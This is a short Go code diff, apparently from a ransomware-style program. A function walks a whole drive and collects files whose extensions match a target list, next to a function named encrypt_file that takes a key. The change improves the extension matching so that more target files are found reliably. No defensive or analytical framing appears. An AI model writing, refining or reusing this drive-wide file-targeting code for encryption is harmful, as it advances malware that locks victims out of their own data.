@@ -163,10 +163,10 @@ func encrypt_file(file_name string, key []byte, done chan bool) error {
 
 func traverse(drive string) error {
 	err := filepath.WalkDir(drive, func(path string, d fs.DirEntry, err error) error {
-		if d.IsDir() != true {
-			path_ext := strings.Split(path, ".")
-			if slices.Contains(EXT, path_ext[1]) {
-				FILES = append(FILES, path)
+		if !d.IsDir(){
+			ext := filepath.Ext(path)
+			if ext != "" && slices.Contains(EXT, strings.ToLower(ext[1:])) { 
+			FILES = append(FILES, path)
 			}
 		}
 		return nil
